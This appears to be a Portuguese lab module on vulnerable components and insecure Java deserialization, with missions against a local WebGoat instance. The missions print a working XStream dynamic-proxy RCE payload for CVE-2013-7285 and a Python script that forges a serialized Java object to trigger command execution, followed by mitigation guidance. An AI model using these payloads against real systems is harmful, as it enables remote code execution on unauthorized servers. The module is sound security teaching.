+### 5.1 Subir o lab e pegar a sessão (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Se
+   faltarem imagens, rode no terminal do WSL `scripts/lab.sh pull webgoat` (único
+   momento com internet). Pela linha de comando, a alternativa para ligar é
+   `scripts/lab.sh up webgoat`.
+2. Abra o desktop do Kali, um terminal, e prepare o endereço do alvo. O WebGoat
+   exige cadastro; atenção à pegadinha da versão 2026.4: **usuário e senha de 6 a
+   10 caracteres**. Cadastre-se e faça login capturando o cookie de sessão:
+
+```console
+$ B=http://webgoat:8080/WebGoat
+$ curl -s -X POST "$B/register.mvc" \
+    --data-urlencode "username=pentest" \
+    --data-urlencode "password=Lab123" \
+    --data-urlencode "matchingPassword=Lab123" \
+    --data-urlencode "agree=agree" -o /dev/null
+$ C=$(curl -s -i -X POST "$B/login" \
+      --data-urlencode "username=pentest" --data-urlencode "password=Lab123" \
+    | grep -i '^set-cookie:' | sed -E 's/.*JSESSIONID=([^;]+);.*/\1/' | tr -d '\r')
+$ echo "sessao: $C"
+sessao: A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6
+```
+
+Guarde o `JSESSIONID` em `$C`; vamos mandá-lo em cada pedido com
+`-H "Cookie: JSESSIONID=$C"`. (Se o `echo` vier vazio, o login falhou: confira o
+tamanho de usuário e senha, de 6 a 10 caracteres.)
+
+### 5.2 Missão 1 — Explorar o componente vulnerável (XStream)
+
+**Cenário:** a lição *Vulnerable Components* recebe, no endpoint
+`POST /VulnerableComponents/attack1`, um parâmetro `payload` com um XML que ela
+desserializa com o XStream vulnerável. Você vai mandar um XML que reconstrói um
+*dynamic proxy* ligado a um `ProcessBuilder`, fazendo o servidor executar um
+comando — a `CVE-2013-7285`.
+
+**Seu objetivo:** obter `lessonCompleted: true` e montar a flag
+`FLAG{cve-numero-classe}` (em minúsculas), onde `cve-numero` é o identificador que
+o campo `feedback` diz que você explorou, e `classe` é o **nome simples** (sem
+pacote) da classe Java que aparece no campo `output` e **prova** que o seu comando
+chegou a ser criado.
+
+O molde do payload está na seção 3.3. Falta você preencher duas coisas que são o
+desafio: **(a)** o pacote completo da interface que a lição espera (o controller
+faz um cast para `Contact`; o proxy precisa implementar **essa** interface, com o
+nome totalmente qualificado), e **(b)** um `COMANDO` qualquer (use algo inócuo,
+como `sleep` com um argumento). Monte o XML em **uma linha só** (a lição remove
+alguns espaços e quebras) e envie:
+
+```console
+$ P='<dynamic-proxy><interface>...</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>sleep</string><string>1</string></command></target><action>start</action></handler></dynamic-proxy>'
+$ curl -s -H "Cookie: JSESSIONID=$C" -X POST "$B/VulnerableComponents/attack1" \
+    --data-urlencode "payload=$P"
+```
+
+<Hint title="Dica 1 — qual interface o proxy deve implementar">
+O controller da lição desserializa e faz `(Contact) xstream.fromXML(payload)`. Se o
+XML descrever um `sorted-set` ou outro tipo, o cast falha e você recebe
+`vulnerable-components.close`. O proxy precisa implementar a interface **`Contact`**
+dessa lição — e no XML ela vai pelo **nome totalmente qualificado** (pacote +
+nome). A lição é a *Vulnerable Components*; o pacote dela, em WebGoat 2026.4, é
+`org.owasp.webgoat.lessons.vulnerablecomponents`.
+</Hint>
+
+<Hint title="Dica 2 — por que funciona mesmo o comando 'quebrando'">
+O `EventHandler` com `action` igual a `start` faz com que, ao chamar um método do
+proxy, o Java invoque `ProcessBuilder.start()`. Esse método devolve um objeto de
+processo, mas o método do proxy esperava devolver uma `String` — então ocorre um
+erro de cast **depois** de o processo já ter sido criado. O WebGoat trata esse
+erro como sucesso: a execução aconteceu. Leia o campo `output`: o erro de cast
+nomeia a classe do processo.
+</Hint>
+
+<Solution title="Solução da Missão 1">
+Com a interface qualificada preenchida, o pedido fica:
+
+```console
+$ P='<dynamic-proxy><interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>sleep</string><string>1</string></command></target><action>start</action></handler></dynamic-proxy>'
+$ curl -s -H "Cookie: JSESSIONID=$C" -X POST "$B/VulnerableComponents/attack1" \
+    --data-urlencode "payload=$P"
+{
+  "assignment" : "VulnerableComponentsLesson",
+  "attemptWasMade" : true,
+  "feedback" : "You successfully tried to exploit the CVE-2013-7285 vulnerability",
+  "feedbackArgs" : null,
+  "lessonCompleted" : true,
+  "output" : "class java.lang.ProcessImpl cannot be cast to class java.lang.String (java.lang.ProcessImpl and java.lang.String are in module java.base of loader 'bootstrap')",
+  "outputArgs" : null
+}
+```
+
+Duas leituras. O `feedback` confirma a `CVE-2013-7285`. E o `output` é a **prova
+da execução**: o erro diz que um `java.lang.ProcessImpl` não pôde ser convertido
+para `String` — ou seja, o `ProcessBuilder.start()` **rodou** e devolveu um
+`ProcessImpl` (o objeto que representa o processo criado). Monte agora a flag no
+formato `FLAG{cve-numero-classe}`: junte o identificador que o `feedback` confirma
+(em minúsculas, como `cve-AAAA-NNNNN`) e o **nome simples** da classe que aparece no
+`output` (o tipo que o `ProcessBuilder.start()` devolveu e não pôde virar `String`),
+também em minúsculas. Envie no campo abaixo.
+</Solution>
+
+<FlagInput task="missao-1-componente" />
+
+### 5.3 Missão 2 — Executar código via desserialização nativa
+
+**Cenário:** a lição *Insecure Deserialization* recebe, em
+`POST /InsecureDeserialization/task`, um parâmetro `token` com um objeto Java
+serializado e **codificado em Base64 url-safe** (o servidor troca `-` por `+` e `_`
+por `/` antes de decodificar). Ela desserializa esse objeto com `readObject()`. Se
+o objeto for um `VulnerableTaskHolder` com um `taskAction` que comece com `sleep`
+(ver 3.2), o `readObject` **executa o comando**. Há ainda uma trava: a lição só
+dá por resolvida se a execução levar **entre 3 e 7 segundos**.
+
+Como o Kali deste lab tem só o *runtime* do Java (sem `javac`) e não tem internet,
+você **não vai compilar** uma classe. Vai forjar os **bytes** da serialização
+direto com Python — o que, de quebra, prova que a serialização é só um formato de
+dados. Abaixo está o "encanamento" pronto (os bytes do cabeçalho, do descritor de
+classe e dos campos). Falta você tomar três decisões — que são o desafio:
+
+```python
+# /tmp/ser.py  — forja um VulnerableTaskHolder serializado (Java), em Base64 url-safe
+import struct, base64
+
+def utf(s):                      # string no formato writeUTF (2 bytes de tamanho + bytes)
+    b = s.encode(); return struct.pack(">H", len(b)) + b
+def jstr(s):                     # um objeto String serializado (TC_STRING)
+    return b"\x74" + utf(s)
+
+UID        = ???                 # (a) qual serialVersionUID o servidor exige?
+TASKACTION = "???"               # (b) qual comando, para cair na janela de 3 a 7 s?
+
+out  = b"\xac\xed\x00\x05"                       # AC ED 00 05: cabeçalho da serialização
+out += b"\x73\x72"                                # TC_OBJECT, TC_CLASSDESC
+out += utf("org.dummy.insecure.framework.VulnerableTaskHolder")
+out += struct.pack(">q", UID) + b"\x02"           # serialVersionUID + flag SERIALIZABLE
+out += struct.pack(">H", 3)                        # 3 campos, em ordem alfabética:
+out += b"L" + utf("requestedExecutionTime") + jstr("Ljava/time/LocalDateTime;")
+out += b"L" + utf("taskAction")              + jstr("Ljava/lang/String;")
+out += b"L" + utf("taskName")                + jstr("Ljava/lang/String;")
+out += b"\x78\x70"                                # fim do descritor, sem superclasse
+# valores dos campos, na mesma ordem:
+out += b"\x70"                                     # (c) requestedExecutionTime = null
+out += jstr(TASKACTION)                            # taskAction
+out += jstr("task")                                # taskName
+print(base64.urlsafe_b64encode(out).decode())
+```
+
+As três decisões:
+
+- **(a) o `serialVersionUID`.** É um número que identifica a versão da classe. Se
+  errar, o servidor recusa dizendo que a versão não bate. Descubra o número certo
+  **probando** (é pequeno).
+- **(b) o `taskAction`.** Precisa começar com `sleep` (ou `ping`), ter menos de 22
+  caracteres, e fazer a execução durar **entre 3 e 7 segundos**.
+- **(c) o `requestedExecutionTime = null`.** Já está resolvido no encanamento, e
+  vale entender por quê (veja a Dica 2).
+
+Envie o token e meça o tempo:
+
+```console
+$ T=$(python3 /tmp/ser.py)
+$ time curl -s -H "Cookie: JSESSIONID=$C" -X POST "$B/InsecureDeserialization/task" \
+    --data-urlencode "token=$T"
+```
+
+<Hint title="Dica 1 — achar o serialVersionUID">
+Comece testando `UID = 1`. A resposta virá com
+`"feedback" : "The serialization id does not match. Probably the version has been
+updated. Let's try again."` e `lessonCompleted: false`. Suba para `UID = 2` e
+compare. O valor certo é o que faz essa mensagem de versão **desaparecer**.
+</Hint>
+
+<Hint title="Dica 2 — a janela de tempo e o campo de data">
+O `readObject` da classe tem duas verificações: se `requestedExecutionTime` **não**
+for `null`, ele exige que a data esteja nos últimos 10 minutos (complicado de
+forjar à mão, porque `LocalDateTime` tem um formato próprio). Mandando esse campo
+como `null` (o byte `\x70`, já no encanamento), essa verificação é **pulada**. A
+outra trava é o tempo de execução: `sleep 5` dura ~5 s, dentro da janela de 3 a 7;
+`sleep 1` é rápido demais e a lição recusa com "Sorry the solution is not correct".
+</Hint>
+
+<Solution title="Solução da Missão 2">
+`UID = 2` e `TASKACTION = "sleep 5"`. Com isso, o token é aceito:
+
+```console
+$ time curl -s -H "Cookie: JSESSIONID=$C" -X POST "$B/InsecureDeserialization/task" \
+    --data-urlencode "token=$T"
+{
+  "assignment" : "InsecureDeserializationTask",
+  "attemptWasMade" : true,
+  "feedback" : "Congratulations. You have successfully completed the assignment.",
+  "feedbackArgs" : null,
+  "lessonCompleted" : true,
+  "output" : null,
+  "outputArgs" : null
+}
+
+real    0m5.069s
+```
+
+O `real 0m5.069s` é a prova: o servidor **executou** `sleep 5` ao desserializar o
+seu objeto — o tempo da resposta é o tempo do comando. Para sentir as travas,
+compare as respostas que você obteve pelo caminho:
+
+```console
+$ # serialVersionUID errado (UID = 1):
+  "feedback" : "The serialization id does not match. Probably the version has been updated. Let's try again."
+$ # um objeto que não é VulnerableTaskHolder (uma String simples):
+  "feedback" : "That is not the VulnerableTaskHolder object. However a plain String is harmless. Let's try again with the right object."
+$ # taskAction rápido demais (sleep 1, ~1 s < 3 s):
+  "feedback" : "Sorry the solution is not correct, please try again."
+```
+
+Monte a flag no formato `FLAG{assignment-uid}`: o campo `assignment` do JSON de
+sucesso (em minúsculas) e o `serialVersionUID` que o servidor exige — o número que
+fez a mensagem de versão desaparecer. Envie no campo abaixo.
+</Solution>
+
+<FlagInput task="missao-2-desserializacao" />
+
+### 5.4 Desligar o laboratório
+
+Terminou? Desligue para respeitar a regra de um lab por vez e liberar RAM:
+
+```console
+$ scripts/lab.sh down webgoat
+```
+
+Pela plataforma, o botão **Desligar** no painel de Laboratório faz o mesmo. Como o
+WebGoat guarda tudo em memória, subir de novo devolve o alvo ao ponto de fábrica.
+
+## 6. Variações e aprofundamento
+
+**Desserialização em outras linguagens.** O conceito é o mesmo; muda o gancho.
+
+- **PHP:** `unserialize()` numa string controlada dispara os *magic methods*
+  `__wakeup()` e `__destruct()` dos objetos reconstruídos. Encadeá-los até uma
+  ação perigosa é a <GlossaryTerm term="POP chain">POP chain</GlossaryTerm>. Daí a
+  regra de nunca passar entrada de usuário a `unserialize()` — e, quando precisar
+  desserializar, usar `json_decode()`.
+- **Python:** `pickle.loads()` executa o método `__reduce__` do objeto, que pode
+  retornar qualquer *callable* com argumentos — isto é, `pickle` de dados não
+  confiáveis é **execução de código por desenho**. A própria documentação do
+  Python avisa em destaque para nunca desempacotar dados de fonte não confiável.
+- **.NET:** formatadores como o `BinaryFormatter` tiveram tantos abusos que a
+  Microsoft o marcou como perigoso e passou a desencorajá-lo.
+
+**Ferramentas de gadget chain.** Montar a corrente à mão é trabalhoso; existe o
+**ysoserial** (Java) e o **ysoserial.net**, que geram payloads prontos para
+dezenas de bibliotecas comuns (Commons-Collections, Spring, etc.). Saber que elas
+existem ajuda a entender por que a mera presença de certas bibliotecas no classpath
+é um risco. Use-as **apenas** no lab ou em alvo autorizado.
+
+**JSON também pode morder — quando ganha tipos.** Alguns desserializadores de JSON
+foram configurados para instanciar o tipo indicado por um campo (o
+`@class`/`$type`/`enableDefaultTyping` das bibliotecas Java e .NET). Aí o JSON
+reconquista o poder perigoso da serialização nativa: o atacante escolhe o tipo, e
+voltam as gadget chains. A lição: o seguro não é o formato "JSON" em si, é **não
+deixar os dados escolherem o tipo** — desligue o *default typing*.
+
+**A cadeia de suprimentos além da versão.** Componente vulnerável é o caso mais
+simples do <GlossaryTerm term="supply chain attack">supply chain attack</GlossaryTerm>
+(ataque à cadeia de suprimentos): a peça tem uma CVE. Há casos piores — o pacote
+legítimo é **sequestrado** e publica uma versão maliciosa, ou um
+<GlossaryTerm term="typosquatting">typosquatting</GlossaryTerm> engana você a
+instalar `reqeusts` no lugar de `requests`. Por isso a categoria **A08:2021 —
+Software and Data Integrity Failures** fala em **integridade**: verificar
+assinaturas, fixar versões (*lockfile*) e conferir hashes, não só atualizar.
+
+## 7. Erros comuns
+
+- **"O XStream recusa com `vulnerable-components.close`."** O objeto reconstruído
+  não é um `Contact`: ou o XML descreve outro tipo (um `sorted-set`, por exemplo,
+  falha no cast), ou o nome da interface no `<interface>` está incompleto. Use o
+  **nome totalmente qualificado** da interface `Contact` da lição.
+- **"Mandei espaços/quebras de linha no XML e mudou o resultado."** A lição filtra
+  alguns caracteres do payload (remove `+`, `\r`, `\n`, e junta `> ` e ` <`).
+  Monte o XML em **uma linha só**, sem espaços entre as tags.
+- **"A desserialização falha com `The serialization id does not match`."** O
+  `serialVersionUID` no seu token não bate com o da classe no servidor. Probe o
+  número certo (é pequeno); em WebGoat 2026.4 é `2`.
+- **"Resolvi, mas a lição não dá como concluída."** Provável a janela de tempo: o
+  comando precisa durar **entre 3 e 7 segundos**. `sleep 5` acerta; `sleep 1` é
+  rápido demais, `sleep 9` é lento demais.
+- **"O token Base64 não decodifica no servidor."** Ele espera Base64 **url-safe**
+  (com `-` e `_`), que é o que `base64.urlsafe_b64encode` produz. Não use o Base64
+  comum nem quebre a string em linhas.
+- **"O `curl` reclama do `<` no XML."** Está mandando o XML direto na linha de
+  comando sem aspas. Ponha o payload entre aspas simples e envie com
+  `--data-urlencode`.
+
+## 8. Defesa e mitigação
+
+As duas falhas têm curas distintas, mas o mesmo espírito: **saber o que você roda**
+e **não confiar em dados para decidir o que construir**.
+
+### 8.1 Contra componentes vulneráveis
+
+**1. Tenha um inventário (SBOM).** Você não defende o que não sabe que tem. Um
+<GlossaryTerm term="software bill of materials">SBOM</GlossaryTerm> lista todos os
+componentes e versões, inclusive os transitivos. Formatos padronizados (CycloneDX,
+SPDX) deixam isso legível por máquina. Foi a falta disto que fez o Log4Shell virar
+caça ao tesouro: empresas não sabiam **se** usavam Log4j.
+
+**2. Rode SCA e trate os achados.** Ferramentas de
+<GlossaryTerm term="software composition analysis">SCA</GlossaryTerm> cruzam as suas
+dependências com bancos de CVE. Rode-as no *build* e falhe o *pipeline* quando
+aparecer algo crítico:
+
+```console
+$ npm audit --audit-level=high          # Node.js
+$ pip-audit                              # Python
+$ dependency-check --scan ./app         # OWASP Dependency-Check (Java e outros)
+```
+
+**3. Atualize — e tenha como atualizar rápido.** A correção da Equifax existia
+havia dois meses. Mantenha as dependências próximas da última versão estável,
+automatize *bumps* (Dependabot/Renovate) e tenha um processo de patch de emergência
+para quando sair o próximo Log4Shell.
+
+**4. Reduza a superfície e os privilégios.** Remova dependências que não usa. E,
+como nem todo patch chega a tempo, rode a aplicação com **mínimo privilégio** e
+**segmente a rede**: foi a falta disso que deixou os atacantes da Equifax saltarem
+de um servidor para 51 bancos de dados.
+
+**5. Não confie em esconder a versão.** Ocultar o cabeçalho `Server:` é
+<GlossaryTerm term="security through obscurity">security through obscurity</GlossaryTerm>:
+atrasa o atacante por minutos e não corrige nada. Faça-o, se quiser, **depois** de
+corrigir — nunca no lugar.
+
+### 8.2 Contra desserialização insegura
+
+**1. Não desserialize dados não confiáveis.** É a regra de ouro. Se os bytes vêm
+do usuário, da rede ou de um arquivo enviado, **não** os passe a `readObject()`,
+`unserialize()` ou `pickle.loads()`.
+
+**2. Prefira formatos de dados puros.** Troque a serialização nativa por JSON,
+YAML (sem tags de tipo) ou Protocol Buffers, mapeados para um tipo que **você**
+fixou. Eles preenchem campos conhecidos e não instanciam tipos à escolha do
+atacante. E **desligue o *default typing*** das bibliotecas de JSON (o
+`@class`/`$type`), que reabre o buraco.
+
+**3. Se a serialização nativa for inevitável, restrinja por allowlist.** Desde o
+Java 9 existe o `ObjectInputFilter`, que permite uma
+<GlossaryTerm term="allowlist">allowlist</GlossaryTerm> de classes aceitas na
+desserialização — tudo o que não estiver na lista é recusado antes de reconstruir:
+
+```java
+// Só estas classes podem ser desserializadas; o resto é rejeitado.
+var filtro = ObjectInputFilter.Config.createFilter(
+    "com.exemplo.ModeloSeguro;java.base/*;!*");
+ois.setObjectInputFilter(filtro);
+```
+
+A blocklist (barrar classes "conhecidamente perigosas") é frágil: há gadgets demais
+e novos surgem. Allowlist é o caminho.
+
+**4. Garanta integridade e autenticidade.** Se você precisa mesmo trafegar um
+objeto serializado (entre dois serviços seus, por exemplo), assine-o com
+<GlossaryTerm term="HMAC">HMAC</GlossaryTerm> e **verifique a assinatura antes de
+desserializar**: assim só bytes gerados por você são aceitos. É a lógica de
+integridade da A08.
+
+**5. Atualize as bibliotecas de (de)serialização.** XStream, Jackson e afins
+lançam correções e trazem *frameworks* de segurança (allowlists). Mantê-las
+atualizadas fecha a ponte entre A06 e A08 — a mesma do seu laboratório.
+
+## 9. Exercícios
+
+### Desafios práticos
+
+<Hint title="Desafio A — probe de versão">
+Antes de atacar, descubra a versão de um componente só pela resposta HTTP. No Kali,
+rode `curl -sI http://webgoat:8080/WebGoat/login` e observe os cabeçalhos. Que
+componentes e versões aparecem? Como um atacante os cruzaria com um banco de CVEs?
+</Hint>
+
+<Hint title="Desafio B — por que o campo de data nulo passa">
+Releia o `readObject` da seção 3.2 (a versão completa está no WebGoat). Explique,
+em duas linhas, por que mandar `requestedExecutionTime = null` **pula** a
+verificação dos 10 minutos — e por que isso torna o payload muito mais fácil de
+forjar à mão do que serializar um `LocalDateTime` real.
+</Hint>
+
+<Hint title="Desafio C — pensar como defensor">
+Dado o filtro `ObjectInputFilter` da seção 8.2, explique por que uma allowlist
+(`com.exemplo.ModeloSeguro;java.base/*;!*`) barra a gadget chain da Missão 2,
+enquanto uma blocklist das "classes perigosas conhecidas" não daria a mesma
+garantia.
+</Hint>
+
+### Quiz
+
+Responda ao quiz para fixar os conceitos. Ele conta para concluir o módulo.
+
+<Quiz task="quiz-final" />
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- **Componente vulnerável (A06:2021)**: a sua aplicação roda bibliotecas de
+  terceiros; a CVE de qualquer uma — inclusive de uma
+  <GlossaryTerm term="transitive dependency">dependência transitiva</GlossaryTerm>
+  que você nunca declarou — é a sua falha. A maioria é
+  <GlossaryTerm term="n-day vulnerability">n-day</GlossaryTerm>: correção
+  disponível, não aplicada.
+- **Desserialização insegura (A08:2021, CWE-502)**: reconstruir um objeto a partir
+  de bytes não confiáveis pode **executar código**, porque a serialização nativa
+  recria o tipo que os bytes mandarem e chama métodos durante a reconstrução — a
+  <GlossaryTerm term="gadget chain">gadget chain</GlossaryTerm>. Ler dados puros
+  (JSON para um tipo fixo) não tem esse poder.
+- As duas se juntam num **componente que desserializa** (XStream, `CVE-2013-7285`):
+  o que você explorou na Missão 1.
+- **Defesa de componente:** <GlossaryTerm term="software bill of materials">SBOM</GlossaryTerm>
+  + <GlossaryTerm term="software composition analysis">SCA</GlossaryTerm> +
+  patching + mínimo privilégio e segmentação. Esconder a versão não conta.
+- **Defesa de desserialização:** não desserializar o não confiável; preferir
+  formatos de dados puros e desligar *default typing*; `ObjectInputFilter` com
+  allowlist quando for inevitável; assinar com HMAC e verificar antes.
+
+### Cola rápida
+
+```text
+Componente vulnerável (A06): achar versão -> cruzar com CVE -> explorar n-day
+  pistas de versão: Server:, X-Powered-By:, /VERSION, JS com a versão
+  defesa: SBOM + SCA (npm audit / pip-audit / dependency-check) + patch + menor privilégio
+
+Desserialização insegura (A08, CWE-502): bytes do atacante -> readObject() -> gadget chain -> RCE
+  Java readObject / PHP unserialize (POP chain) / Python pickle.loads
+  lab XStream:  POST /VulnerableComponents/attack1  payload=<dynamic-proxy>...   -> CVE-2013-7285
+  lab nativo:   POST /InsecureDeserialization/task  token=<base64url do objeto>  -> sleep 5 (janela 3-7 s)
+  defesa: não desserializar não confiável -> JSON p/ tipo fixo -> ObjectInputFilter (allowlist) -> HMAC
+```
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [OWASP Top 10 2021 — A06: Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) — a definição canônica da categoria.
+- [OWASP Top 10 2021 — A08: Software and Data Integrity Failures](https://owasp.org/Top10/2021/A08_2021-Software_and_Data_Integrity_Failures/index.html) — onde a desserialização insegura vive hoje.
+- [OWASP Cheat Sheet — Deserialization](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) — defesas por linguagem, com exemplos.
+- [XStream — CVE-2013-7285](https://x-stream.github.io/CVE-2013-7285.html) — a falha do seu laboratório, descrita pelo projeto.
